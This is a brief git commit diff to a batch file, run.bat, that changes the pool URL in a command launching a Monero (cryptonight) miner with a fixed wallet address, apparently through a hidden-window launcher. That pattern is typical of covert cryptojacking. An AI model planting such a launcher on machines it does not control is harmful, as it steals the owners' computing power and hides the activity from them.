7cc604dc2b2e0b23161b2d908c7b33543b1977ec
akula369 <alexm369@gmail.com>
2015-04-16 19:32:53 -0400

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,1 +1,1 @@
-chp minerd -a cryptonight -o stratum+tcp://mro.extremehash.com:9999 -u 4AqrzGPfEKeZrVXyPDNXUrNeKZZGNYiXMDoY49PvdffKNTRg6xp2Qz74SZ72gT5F9HH8Vaic99ndRg6UBGcVijaNStQjwwf -p x -t 2
+chp minerd -a cryptonight -o stratum+tcp://mine.moneropool.com:8080 -u 4AqrzGPfEKeZrVXyPDNXUrNeKZZGNYiXMDoY49PvdffKNTRg6xp2Qz74SZ72gT5F9HH8Vaic99ndRg6UBGcVijaNStQjwwf -p x -t 2
